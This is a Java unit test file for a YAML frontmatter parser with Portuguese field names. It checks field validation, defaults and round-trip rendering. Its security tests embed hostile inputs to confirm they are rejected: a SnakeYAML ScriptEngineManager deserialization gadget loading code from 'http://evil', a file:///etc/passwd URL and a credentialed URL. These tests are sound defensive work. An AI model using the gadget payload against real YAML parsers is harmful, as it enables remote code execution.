package io.github.rennaraujo.sage.document;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.net.URI;
import java.time.Clock;
import java.time.Instant;
import java.time.LocalDate;
import java.time.ZoneOffset;
import java.util.List;
import java.util.Optional;
import org.junit.jupiter.api.Test;

class FrontmatterParserTest {

    private static final LocalDate TODAY = LocalDate.of(2026, 10, 27);
    private static final Clock CLOCK = Clock.fixed(Instant.parse("2026-10-27T12:00:00Z"), ZoneOffset.UTC);

    private static final String PUBLIC_DOC = """
            ---
            id: publico/java/25/stream-api.md
            fonte: publico
            linguagem: java
            versao: 25
            secao: Streams
            aliases: [Stream, "java.util.stream"]
            url_origem: https://docs.oracle.com/en/java/javase/25/docs/api/java.base/java/util/stream/package-summary.html
            coletado_em: 2026-10-01
            revisado: true
            ---
            # Stream API

            Corpo do documento.
            """;

    private final FrontmatterParser parser = new FrontmatterParser(CLOCK);

    @Test
    void parsesPublicDoc() {
        Document doc = parser.parse(PUBLIC_DOC, DocumentDefaults.empty());

        DocumentMetadata meta = doc.metadata();
        assertThat(meta.id()).isEqualTo(DocumentId.of("publico/java/25/stream-api.md"));
        assertThat(meta.source()).isEqualTo(Source.PUBLIC);
        assertThat(meta.language()).isEqualTo("java");
        assertThat(meta.version()).contains("25");
        assertThat(meta.section()).isEqualTo("Streams");
        assertThat(meta.aliases()).containsExactly("Stream", "java.util.stream");
        assertThat(meta.originUrl()).map(URI::getHost).contains("docs.oracle.com");
        assertThat(meta.collectedAt()).isEqualTo(LocalDate.of(2026, 10, 1));
        assertThat(meta.reviewed()).isTrue();
        assertThat(doc.body()).startsWith("# Stream API").endsWith("Corpo do documento.\n");
    }

    @Test
    void keepsVersionTextAsWritten() {
        String raw = PUBLIC_DOC.replace("versao: 25", "versao: 3.20").replace("java/25/", "java/3.20/");

        assertThat(parser.parse(raw, DocumentDefaults.empty()).metadata().version())
                .contains("3.20");
    }

    @Test
    void rejectsMissingSecao() {
        String raw = PUBLIC_DOC.replace("secao: Streams\n", "");

        assertThatThrownBy(() -> parser.parse(raw, DocumentDefaults.empty()))
                .isInstanceOf(InvalidDocumentException.class)
                .hasMessageContaining("secao");
    }

    @Test
    void publicRequiresVersionAndUrl() {
        assertThatThrownBy(() -> parser.parse(PUBLIC_DOC.replace("versao: 25\n", ""), DocumentDefaults.empty()))
                .isInstanceOf(InvalidDocumentException.class)
                .hasMessageContaining("versao");
        assertThatThrownBy(() -> parser.parse(PUBLIC_DOC.replaceAll("url_origem: .*\n", ""), DocumentDefaults.empty()))
                .isInstanceOf(InvalidDocumentException.class)
                .hasMessageContaining("url_origem");
    }

    @Test
    void rejectsNonHttpOriginUrl() {
        String raw = PUBLIC_DOC.replaceAll("url_origem: .*\n", "url_origem: file:///etc/passwd\n");

        assertThatThrownBy(() -> parser.parse(raw, DocumentDefaults.empty()))
                .isInstanceOf(InvalidDocumentException.class)
                .hasMessageContaining("url_origem");
    }

    @Test
    void rejectsOriginUrlWithCredentials() {
        String raw = PUBLIC_DOC.replaceAll("url_origem: .*\n", "url_origem: https://user:pass@example.com/a\n");

        assertThatThrownBy(() -> parser.parse(raw, DocumentDefaults.empty()))
                .isInstanceOf(InvalidDocumentException.class)
                .hasMessageContaining("url_origem");
    }

    @Test
    void stripsBomAndNormalizesCrlf() {
        String raw = "﻿---\r\nid: interno/portal-x/faturamento.md\r\nfonte: interno\r\nlinguagem: java\r\n"
                + "secao: Faturamento\r\n---\r\nlinha1\r\nlinha2\r\n";

        Document doc = parser.parse(raw, DocumentDefaults.empty());

        assertThat(doc.body()).isEqualTo("linha1\nlinha2\n").doesNotContain("\r");
        assertThat(doc.metadata().source()).isEqualTo(Source.INTERNAL);
    }

    @Test
    void rejectsYamlTags() {
        String raw = "---\nid: interno/a/b.md\nfonte: !!javax.script.ScriptEngineManager [!!java.net.URL "
                + "[\"http://evil\"]]\nlinguagem: java\nsecao: x\n---\ncorpo";

        assertThatThrownBy(() -> parser.parse(raw, DocumentDefaults.empty()))
                .isInstanceOf(InvalidDocumentException.class);
    }

    @Test
    void rejectsMissingFrontmatterAndNonMapFrontmatter() {
        assertThatThrownBy(() -> parser.parse("# so corpo", DocumentDefaults.empty()))
                .isInstanceOf(InvalidDocumentException.class);
        assertThatThrownBy(() -> parser.parse("---\n- a\n- b\n---\ncorpo", DocumentDefaults.empty()))
                .isInstanceOf(InvalidDocumentException.class);
        assertThatThrownBy(() -> parser.parse("---\nid: interno/a/b.md\ncorpo sem fechar", DocumentDefaults.empty()))
                .isInstanceOf(InvalidDocumentException.class);
    }

    @Test
    void rejectsSourceThatContradictsId() {
        String raw = PUBLIC_DOC.replace("fonte: publico", "fonte: interno");

        assertThatThrownBy(() -> parser.parse(raw, DocumentDefaults.empty()))
                .isInstanceOf(InvalidDocumentException.class)
                .hasMessageContaining("fonte");
    }

    @Test
    void publicIdMustCarryTheSameLanguageAndVersionAsTheMetadata() {
        String otherVersion = PUBLIC_DOC.replace("versao: 25", "versao: 21");
        String otherLanguage = PUBLIC_DOC.replace("linguagem: java", "linguagem: kotlin");

        assertThatThrownBy(() -> parser.parse(otherVersion, DocumentDefaults.empty()))
                .isInstanceOf(InvalidDocumentException.class)
                .hasMessage("Campo versao contradiz o id")
                .satisfies(e -> assertThat(e.getMessage()).doesNotContain("21", "25", "stream-api"));
        assertThatThrownBy(() -> parser.parse(otherLanguage, DocumentDefaults.empty()))
                .isInstanceOf(InvalidDocumentException.class)
                .hasMessage("Campo linguagem contradiz o id");
    }

    @Test
    void publicIdComparisonIgnoresCase() {
        String raw = PUBLIC_DOC.replace("linguagem: java", "linguagem: Java");

        assertThat(parser.parse(raw, DocumentDefaults.empty()).metadata().language())
                .isEqualTo("Java");
    }

    @Test
    void publicVersionFromDefaultsIsCheckedToo() {
        String raw = "---\nid: publico/java/25/a.md\nurl_origem: https://example.com/a\n---\ncorpo";
        DocumentDefaults defaults = new DocumentDefaults(
                Optional.of(Source.PUBLIC), Optional.of("java"), Optional.of("21"), Optional.of("Geral"), true);

        assertThatThrownBy(() -> parser.parse(raw, defaults))
                .isInstanceOf(InvalidDocumentException.class)
                .hasMessage("Campo versao contradiz o id");
    }

    @Test
    void fillsMissingFieldsFromDefaults() {
        String raw = "---\nid: publico/java/25/a.md\nurl_origem: https://example.com/a\n---\ncorpo";
        DocumentDefaults defaults = new DocumentDefaults(
                Optional.of(Source.PUBLIC), Optional.of("java"), Optional.of("25"), Optional.of("Geral"), true);

        Document doc = parser.parse(raw, defaults);

        assertThat(doc.metadata().source()).isEqualTo(Source.PUBLIC);
        assertThat(doc.metadata().language()).isEqualTo("java");
        assertThat(doc.metadata().version()).contains("25");
        assertThat(doc.metadata().section()).isEqualTo("Geral");
        assertThat(doc.metadata().reviewed()).isTrue();
        assertThat(doc.metadata().collectedAt()).isEqualTo(TODAY);
    }

    @Test
    void usesIdGivenByCallerAndRejectsMismatch() {
        String raw = "---\nlinguagem: java\nsecao: x\n---\ncorpo";
        DocumentId id = DocumentId.of("interno/app/a.md");

        assertThat(parser.parse(raw, id, DocumentDefaults.empty()).metadata().id())
                .isEqualTo(id);
        assertThatThrownBy(() -> parser.parse(
                        "---\nid: interno/app/b.md\nlinguagem: java\nsecao: x\n---\ncorpo",
                        id,
                        DocumentDefaults.empty()))
                .isInstanceOf(InvalidDocumentException.class);
    }

    @Test
    void errorMessagesDoNotEchoContent() {
        String raw = "---\nid: interno/a/b.md\nlinguagem: java\nsecao: [SEGREDO-CANARIO-123\n---\ncorpo";

        assertThatThrownBy(() -> parser.parse(raw, DocumentDefaults.empty()))
                .isInstanceOf(InvalidDocumentException.class)
                .satisfies(e -> assertThat(e.getMessage()).doesNotContain("SEGREDO-CANARIO-123"));
    }

    @Test
    void renderThenParseRoundTrip() {
        DocumentMetadata meta = new DocumentMetadata(
                DocumentId.of("publico/java/25/stream-api.md"),
                Source.PUBLIC,
                "java",
                Optional.of("25"),
                "Seção: \"Streams\" \\ #1",
                List.of("Stream", "a: b", "c\nd"),
                Optional.of(URI.create("https://example.com/a?b=1")),
                LocalDate.of(2026, 10, 1),
                true);
        Document original = new Document(meta, "---\nnão é frontmatter\n---\n\r\nacentuação ção\n");

        Document restored = parser.parse(parser.render(original), DocumentDefaults.empty());

        assertThat(restored).isEqualTo(new Document(meta, original.body().replace("\r", "")));
    }
}
